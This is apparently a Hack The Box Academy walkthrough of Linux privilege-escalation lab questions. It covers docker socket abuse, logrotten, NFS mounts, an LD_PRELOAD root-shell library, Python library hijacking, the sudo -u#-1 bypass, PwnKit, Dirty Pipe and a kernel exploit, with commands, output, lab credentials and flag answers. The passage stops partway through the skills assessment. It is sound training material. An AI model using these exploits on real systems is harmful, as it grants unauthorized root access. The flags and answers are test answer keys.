### "Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac-594497@htb-2nilp36wn9]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.237

The authenticity of host '10.129.205.237 (10.129.205.237)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.237' (ECDSA) to the list of known hosts.
htb-student@10.129.205.237's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Next, students need to verify that the `htb-student` user is part of the `docker` group:

Code: shell

```shell
id
```

```shell-session
htb-student@ubuntu:~$ id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
```

Confirming the group membership, students now need to enumerate available docker images:

Code: shell

```shell
docker image ls
```

```shell-session
htb-student@ubuntu:~$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    5a81c4b8502e   5 weeks ago   77.8MB

```

Discovering the `ubuntu` image, students need to utilize the docker socket located at `/var/run/docker.sock` to escalate privileges:

Code: shell

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

```shell-session
htb-student@ubuntu:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@bdf770b635d6:/# 
```

By using the `chroot` command to modify the container's root directory to match the host's, followed by executing `bash` within the container, a root shell is initialized and students can read the flag:

Code: shell

```shell
cat /root/flag.txt
```

```shell-session
root@bdf770b635d6:/# cat /root/flag.txt

HTB{D0ck3r_Pr1vE5c}
```

Answer: `HTB{D0ck3r_Pr1vE5c}`

# Logrotate

## Question 1

### "Escalate the privileges and submit the contents of flag.txt as the answer"

Students first need to clone the repository for LogRotten and transfer it to the target using `scp` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
git clone https://github.com/whotwagner/logrotten.git
scp -r logrotten/ htb-student@STMIP:~/
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-h5qyjhxa2m]─[~]
└──╼ [★]$ git clone https://github.com/whotwagner/logrotten.git

Cloning into 'logrotten'...
remote: Enumerating objects: 103, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 103 (delta 7), reused 5 (delta 2), pack-reused 87
Receiving objects: 100% (103/103), 437.20 KiB | 7.05 MiB/s, done.
Resolving deltas: 100% (44/44), done.

┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-h5qyjhxa2m]─[~]
└──╼ [★]$ scp -r logrotten/ htb-student@10.129.204.41:~/

htb-student@10.129.204.41's password: 
logrotten.c       100% 7508     2.0MB/s   00:00
logrotate.cfg     100%   89    41.4KB/s   00:00
create_env.sh     100%  839   405.2KB/s   00:00
pwnme.log

<SNIP>
100%  195KB  31.4MB/s   00:00
exclude           100%  240   110.6KB/s   00:00 
```

Then, students need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-h5qyjhxa2m]─[~]
└──╼ [★]$ ssh htb-student@10.129.204.41

The authenticity of host '10.129.204.41 (10.129.204.41)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.41' (ECDSA) to the list of known hosts.
htb-student@10.129.204.41's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-051900-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Upon connecting, students need to navigate into the newly transferred directory, compiling the `logrotten.c` file into an executable:

Code: shell

```shell
cd logrotten/
ls
gcc -o logrotten logrotten.c
chmod +x logrotten
```

```shell-session
htb-student@ubuntu:~$ cd logrotten/
htb-student@ubuntu:~/logrotten$ ls

README.md  logrotten.c  logrotten.png  test

htb-student@ubuntu:~/logrotten$ gcc -o logrotten logrotten.c
htb-student@ubuntu:~/logrotten$ chmod +x logrotten
```

Subsequently, students need to write a payload to write the contents of `/root/flag.txt` to a file in their home directory:

Code: shell

```shell
echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
```

```shell-session
htb-student@ubuntu:~/logrotten$ echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
```

Finally, students need to make an edit to the`/home/htb-student/backups/access.log` log file and trigger the exploit:

Code: shell

```shell
echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload
```

```shell-session
htb-student@ubuntu:~/logrotten$ echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload

Waiting for rotating /home/htb-student/backups/access.log...
Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

With the exploit effectively creating a copy of the root flag, students need to read its contents:

Code: shell

```shell
cat /home/htb-student/flag.txt
```

```shell-session
htb-student@ubuntu:~/logrotten$ cat /home/htb-student/flag.txt

HTB{l0G_r0t7t73N_00ps}
```

The flag reads `HTB{l0G_r0t7t73N_00ps}`.

Answer: `HTB{l0G_r0t7t73N_00ps}`

# Miscellaneous Techniques

## Question 1

### "Review the NFS server's export list and find a directory holding a flag."

After spawning the target machine, students first need to list its exports using `showmount` with the `-e` (short version of the long version `--exports`) option:

Code: shell

```shell
showmount -e STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ showmount -e 10.129.2.210

Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

Students subsequently need to mount the NFS share `/var/nfs/general` using the `mount` command with the `-t` (short version of the long version `--type`) option:

Code: shell

```shell
sudo mount -t nfs STMIP:/var/nfs/general /mnt
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo mount -t nfs 10.129.2.210:/var/nfs/general /mnt
```

At last, students will find the flag `exports_flag.txt` in the `/mnt` directory:

Code: shell

```shell
cat /mnt/exports_flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[/]
└──╼ [★]$ cat /mnt/exports_flag.txt

fc8c065b9384beaa162afe436a694acf
```

Answer: `fc8c065b9384beaa162afe436a694acf`

# Kernel Exploits

## Question 1

### "Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory."

First, students need to connect to the spawned target machine using `SSH` and the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Next, students need to identify the Linux OS version:

Code: shell

```shell
cat /etc/lsb-release
```

```shell-session
htb-student@NIX02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.6 LTS"
```

Having identified the OS version as `Ubuntu 18.04 LTS`, students need to use Google to find a corresponding kernel exploit; ultimately discovering [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493).

Students need to download the exploit to their attack host, then compile it with `gcc`:

Code: shell

```shell
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
gcc exploit.c -o kernelExploit
chmod +x kernelExploit
```

```shell-session
┌─[eu-academy-1]─[10.10.14.40]─[htb-ac-594497@htb-mrizotlp0i]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c

--2024-01-26 17:03:02--  https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3560 (3.5K) [text/plain]
Saving to: ‘exploit.c’

exploit.c                                      100%[=================================================================================================>]   3.48K  --.-KB/s    in 0s      

2024-01-26 17:03:02 (16.7 MB/s) - ‘exploit.c’ saved [3560/3560]

┌─[eu-academy-1]─[10.10.14.40]─[htb-ac-594497@htb-mrizotlp0i]─[~]
└──╼ [★]$ gcc exploit.c -o kernelExploit

┌─[eu-academy-1]─[10.10.14.40]─[htb-ac-594497@htb-mrizotlp0i]─[~]
└──╼ [★]$ chmod +x kernelExploit 
```

Subsequently, students need to use `scp` to transfer the compiled exploit to the target machine:

Code: shell

```shell
scp kernelExploit htb-student@STMIP:/home/htb-student/
```

```shell-session
┌─[eu-academy-1]─[10.10.14.40]─[htb-ac-594497@htb-mrizotlp0i]─[~]
└──╼ [★]$ scp kernelExploit htb-student@10.129.102.187:/home/htb-student/

htb-student@10.129.102.187's password: 
kernelExploit                                                                                                                                          100%   21KB 118.4KB/s   00:00 
```

Now, students need return to the initial SSH session and run the exploit, obtaining a root shell:

Code: shell

```shell
./kernelExploit
```

```shell-session
htb-student@NIX02:~$ ./kernelExploit 

bash-4.4# 
```

Finally, students need to read the contents of the flag:

Code: shell

```shell
cat /root/kernel_exploit/flag.txt
```

```shell-session
bash-4.4# cat /root/kernel_exploit/flag.txt

46237b8aa523bc7e0365de09c0c0164f
```

Answer: `46237b8aa523bc7e0365de09c0c0164f`

# Shared Libraries

## Question 1

### "Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory."

Students first need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.150.148

The authenticity of host '10.129.150.148 (10.129.150.148)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.150.148' (ECDSA) to the list of known hosts.
htb-student@10.129.150.148's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Students then need to use `sudo` with the `-l` (short version of the long version `--list`) option to list the allowed (and forbidden) commands for the invoking user:

Code: shell

```shell
sudo -l
```

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

Students will find that the invoking user has the right to launch `openssl` as root, thus, they need to run a custom shared library file that will exploit `LD_PRELOAD`. Students first need to save the following `C` code into a file:

Code: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Subsequently, students need to compile the `C` code file using `gcc`:

Code: shell

```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell-session
htb-student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles

root.c: In function ‘_init’:
root.c:7:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
 setgid(0);
 ^
root.c:8:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
 setuid(0);
 ^
```

Once compiled, students need to escalate privileges by running `openssl` and setting `root.so` to be loaded before any other library:

Code: shell

```shell
sudo LD_PRELOAD=./root.so /usr/bin/openssl
```

```shell-session
htb-student@NIX02:~$ sudo LD_PRELOAD=./root.so /usr/bin/openssl 

root@NIX02:~# 
```

At last, students need to print out the contents of the flag at `/root/ld_preload`:

Code: shell

```shell
cat /root/ld_preload/flag.txt
```

```shell-session
root@NIX02:~# cat /root/ld_preload/flag.txt

6a9c151a599135618b8f09adc78ab5f1
```

Answer: `6a9c151a599135618b8f09adc78ab5f1`

# Shared Object Hijacking

## Question 1

### "Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section."

Students first need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

To attain the flag without recreating all the examples/techniques taught in the section (which is highly discouraged), students need to use the `ldd` command with the `--version` option to check the version of `glibc`:

Code: shell

```shell
ldd --version
```

```shell-session
htb-student@NIX02:~/shared_obj_hijack$ ldd --version

ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27

<SNIP>
```

Thus, the `glibc` version is `2.27`.

Answer: `2.27`

# Python Library Hijacking

## Question 1

### "Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-acpl2d3fyg]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.114

The authenticity of host '10.129.205.114 (10.129.205.114)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.114' (ECDSA) to the list of known hosts.
htb-student@10.129.205.114's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Next, students need to perform a quick enumeration of the environment:

Code: shell

```shell
ls
cat mem_status.py
sudo -l
```

```shell-session
htb-student@ubuntu:~$ ls

mem_status.py

htb-student@ubuntu:~$ cat mem_status.py 

#!/usr/bin/env python3
import psutil 

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")



htb-student@ubuntu:~$ sudo -l

Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

Discovering that the `mem_status.py` script can be run with elevated privileges, students need to take advantage of library hijacking. Students need to identify their permissions on the `psutil` library, which contains the `virtual_memory` function:

Code: shell

```shell
grep -r "def virtual_memory*" /usr/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```shell-session
htb-student@ubuntu:~$ grep -r "def virtual_memory*" /usr/

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():

htb-student@ubuntu:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--r-- 1 htb-student staff 87657 Jun  8 09:21 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Students need to open `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py` with vim:

Code: shell

```shell
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Then, students need to modify the `virtual_memory` function, using `os.system` to read the flag:

Code: python

```python
    import os
    os.system('cat /root/flag.txt')
```

![Linux_Privilege_Escalation_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_3.png)

Saving the changes, students need to run the `mem_status.py` script using sudo. The script successfully displays the flag, `HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}`:

Code: shell

```shell
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

```shell-session
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py 

HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
Available memory: 87.34%
```

Answer: `HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}`

# Sudo

## Question 1

### "Escalate the privileges and submit the contents of flag.txt as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-acpl2d3fyg]─[~]
└──╼ [★]$ ssh htb-student@10.129.235.233

The authenticity of host '10.129.235.233 (10.129.235.233)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.235.233' (ECDSA) to the list of known hosts.
htb-student@10.129.235.233's password: 

<SNIP>

$ 
```

Then, students need to elevate to a Bash shell and check their sudo privileges:

Code: shell

```shell
bash -i
sudo -l
```

```shell-session
$ bash -i

htb-student@ubuntu:~$ sudo -l

[sudo] password for htb-student: 
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

Identifying that the `/bin/ncdu` binary can be ran as root, students need to check the man pages of the binary to identify possible privilege escalation vectors:

Code: shell

```shell
man -P cat ncdu
```

```shell-session
htb-student@ubuntu:~$ man -P cat ncdu

NCDU(1)                                         ncdu manual                                         NCDU(1)

NAME
       ncdu - NCurses Disk Usage

SYNOPSIS
       ncdu [options] dir

DESCRIPTION
       ncdu (NCurses Disk Usage) is a curses-based version of the well-known 'du', and provides a fast way

<SNIP>

       i   Show information about the current selected item.

       r   Refresh/recalculate the current directory.

       b   Spawn shell in current directory.

           Ncdu will determine your preferred shell from the "NCDU_SHELL" or "SHELL" variable (in that
           order), or will call "/bin/sh" if neither are set.  This allows you to also configure another
           command to be run when he 'b' key is pressed. For example, to spawn the vifm(1) file manager
           instead of a shell, run ncdu as follows:
<SNIP>
```

Option `b` will spawn a shell in the current directory. Now, students need to run `/bin/ncdu` with sudo, while specifying user ID `-1` (which processes into `0`, or the root user):

Code: shell

```shell
sudo -u#-1 /bin/ncdu
b
```

```shell-session
htb-student@ubuntu:~$ sudo -u#-1 /bin/ncdu

ncdu 1.14.1 ~ Use the arrow keys to navigate, press ? for help                                                
--- /home/htb-student ----------------------------------------------------------------------------------------
    4.0 KiB [##########] /.cache                                                                              
@   0.0   B [          ]  .bash_history
```

After pressing `b`, students will see a root shell prompt, and the flag can then be read:

Code: shell

```shell
cat /root/flag.txt
```

```shell-session
# cat /root/flag.txt

HTB{SuD0_e5c4l47i0n_1id}
```

The content of the flag is shown to be `HTB{SuD0_e5c4l47i0n_1id}`.

Answer: `HTB{SuD0_e5c4l47i0n_1id}`

# Polkit

## Question 1

### "Escalate the privileges and submit the contents of flag.txt as the answer."

Students need to first clone the repository for the [Pwnkit PoC](https://github.com/arthepsy/CVE-2021-4034.git), and then transfer it to the target using `scp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
git clone https://github.com/arthepsy/CVE-2021-4034.git
scp -r CVE-2021-4034/ htb-student@STMIP:~/
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-acpl2d3fyg]─[~]
└──╼ [★]$ git clone https://github.com/arthepsy/CVE-2021-4034.git

Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 18 (delta 2), reused 0 (delta 0), pack-reused 14
Receiving objects: 100% (18/18), 4.79 KiB | 4.79 MiB/s, done.
Resolving deltas: 100% (3/3), done.

┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-acpl2d3fyg]─[~]
└──╼ [★]$ scp -r CVE-2021-4034/ htb-student@10.129.205.113:~/

htb-student@10.129.205.113's password: 
cve-2021-4034-poc.c                                                                                                                                         100% 1267   382.4KB/s   00:00    
README.md                                                                                                                                                   100% 1271   625.6KB/s   00:00    
index                                                                                                                                                       100%  225    71.4KB/s   00:00    
config                                                                                                                                                      100%  266    
<SNIP>
```

Then, students need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-acpl2d3fyg]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.113

The authenticity of host '10.129.205.113 (10.129.205.113)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.113' (ECDSA) to the list of known hosts.
htb-student@10.129.205.113's password: 

<SNIP>

htb-student@ubuntu:~$ 
```

Subsequently, students need to navigate into the transferred directory, where they will compile and run the exploit:

Code: shell

```shell
cd CVE-2021-4034/
gcc -o poc cve-2021-4034-poc.c
chmod +x poc
./poc
```

```shell-session
htb-student@ubuntu:~$ cd CVE-2021-4034/
htb-student@ubuntu:~/CVE-2021-4034$ gcc -o poc cve-2021-4034-poc.c 
htb-student@ubuntu:~/CVE-2021-4034$ chmod +x poc
htb-student@ubuntu:~/CVE-2021-4034$ ./poc

# 
```

Having escalated to root, students need to read the contents of the flag:

Code: shell

```shell
cat /root/flag.txt
```

```shell-session
# cat /root/flag.txt

HTB{p0Lk1tt3n}
```

Finally, students will see that the flag reads `HTB{p0Lk1tt3n}`.

Answer: `HTB{p0Lk1tt3n}`

# Dirty Pipe

## Question 1

### "Escalate the privileges and submit the contents of flag.txt as the answer."

First, students need to clone the repository for the [Dirty Pipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git) exploit and then transfer it to the target using `scp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`

Code: shell

```shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@STMIP:~/
```

```shell-session
┌─[eu-academy-1]─[10.10.15.141]─[htb-ac-594497@htb-rkxqsrkwmn]─[~]
└──╼ [★]$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

Cloning into 'CVE-2022-0847-DirtyPipe-Exploits'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 27 (delta 7), reused 9 (delta 2), pack-reused 0
Receiving objects: 100% (27/27), 11.46 KiB | 1.15 MiB/s, done.
Resolving deltas: 100% (7/7), done.

┌─[eu-academy-1]─[10.10.15.141]─[htb-ac-594497@htb-rkxqsrkwmn]─[~]
└──╼ [★]$ scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@10.129.204.55:~/

The authenticity of host '10.129.204.55 (10.129.204.55)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.55' (ECDSA) to the list of known hosts.
htb-student@10.129.204.55's password: 
exploit-2.c                                   100% 7752     3.0MB/s   00:00
exploit-1.c                                   100% 5364     2.6MB/s   00:00
README.md                                     100% 2937     1.5MB/s   00:00
<SNIP>
```

Then, students need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.141]─[htb-ac-594497@htb-rkxqsrkwmn]─[~]
└──╼ [★]$ ssh htb-student@10.129.204.55

htb-student@10.129.204.55's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-051500-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Students need to check if the kernel version is vulnerable:

Code: shell

```shell
uname -r
```

```shell-session
htb-student@ubuntu:~$ uname -r

5.15.0-051500-generic
```

Confirming the vulnerability (as all kernel versions from 5.8 - 5.17 are vulnerable), students need to navigate into the transferred directory and use the first exploit version, `exploit-1:

Code: shell

```shell
cd CVE-2022-0847-DirtyPipe-Exploits/
bash compile.sh
./exploit-1
```

```shell-session
htb-student@ubuntu:~$ cd CVE-2022-0847-DirtyPipe-Exploits/
htb-student@ubuntu:~/CVE-2022-0847-DirtyPipe-Exploits$ bash compile.sh
htb-student@ubuntu:~/CVE-2022-0847-DirtyPipe-Exploits$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
```

Taking advantage of the root shell, students need to read the contents of the flag:

Code: shell

```shell
cat /root/flag.txt
```

```shell-session
cat /root/flag.txt

HTB{D1rTy_DiR7Y}
```

Answer: `HTB{D1rTy_DiR7Y}`

# Linux Local Privilege Escalation - Skills Assessment

## Question 1

### "Submit the contents of flag1.txt"

After spawning the target machine, students need to connect to it with SSH using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-7lpyzphcoo]─[~]
└──╼ [★]$ ssh htb-student@10.129.221.202

The authenticity of host '10.129.221.202 (10.129.221.202)' can't be established.
ECDSA key fingerprint is SHA256:zc+ec88hOj4ODcdmeIyaiDUPzbMJTK+KTDINOTHXHxg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.221.202' (ECDSA) to the list of known hosts.
htb-student@10.129.221.202's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)

<SNIP>

htb-student@nix03:~$
```

Then, students need to use `ls` with the `-lA` options to list hidden files and their details, finding the directory `.config`:

Code: shell

```shell
ls -lA
```

```shell-session
htb-student@nix03:~$ ls -lA
total 24
-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history
-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrc
drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
```

Within the `.config` directory, students will find a hidden file that contains the flag:

Code: shell

```shell
ls -lA .config/
```

```shell-session
htb-student@nix03:~$ ls -lA .config/

total 4
-rw-r--r-- 1 htb-student www-data 33 Sep  6  2020 .flag1.txt
```

Therefore, students need to print its contents out to attain the flag:

Code: shell

```shell
cat .config/.flag1.txt
```

```shell-session
htb-student@nix03:~$ cat .config/.flag1.txt

LLPE{d0n_ov3rl00k_h1dden_f1les!}
```

Answer: `LLPE{d0n_ov3rl00k_h1dden_f1les!}`

# Linux Local Privilege Escalation - Skills Assessment

## Question 2

### "Submit the contents of flag2.txt"

Using the same SSH session established in the previous question, students need to use `cat` on the `.bash_history` file under the directory `/home/barry`, finding the password `i_l0ve_s3cur1ty!`:

Code: shell

```shell
cat /home/barry/.bash_history
```

```shell-session
htb-student@nix03:~$ cat /home/barry/.bash_history

cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
